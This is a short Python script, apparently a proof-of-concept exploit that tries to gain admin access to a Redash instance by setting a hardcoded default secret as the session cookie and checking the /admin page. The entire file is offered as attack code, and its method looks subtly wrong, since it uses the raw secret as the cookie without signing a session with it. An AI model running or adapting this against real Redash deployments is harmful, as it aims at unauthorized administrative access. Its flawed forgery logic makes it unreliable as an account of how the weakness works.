import os
import requests

# Default secret used in vulnerable installations
default_secret = 'c292a0a3aa32397cdb050e233733900f'

# URL to the Redash instance (change this to the actual URL of the Redash instance you are testing)
redash_url = 'http://localhost:5000'

# Attempt to forge a session using the default secret
session = requests.Session()
session.cookies.set('session', default_secret, domain='localhost')

# Try to access a protected resource
response = session.get(f'{redash_url}/admin')

if 'Admin Area' in response.text:
    print('The ACI exploit success!!!')
else:
    print('The ACI exploit failed!!!')
